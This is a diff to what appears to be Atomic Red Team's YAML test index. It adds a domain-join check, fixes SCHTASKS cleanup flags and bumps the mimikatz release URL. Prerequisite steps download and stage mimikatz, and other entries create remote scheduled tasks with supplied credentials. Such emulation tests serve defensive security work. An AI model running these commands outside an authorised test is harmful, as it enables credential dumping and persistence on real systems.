@@ -2345,6 +2345,18 @@ credential-access:
         there is no output\n"
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -16370,7 +16382,7 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -30026,7 +30038,7 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -44737,7 +44749,7 @@ persistence:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -60600,7 +60612,7 @@ execution:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -62510,7 +62522,7 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
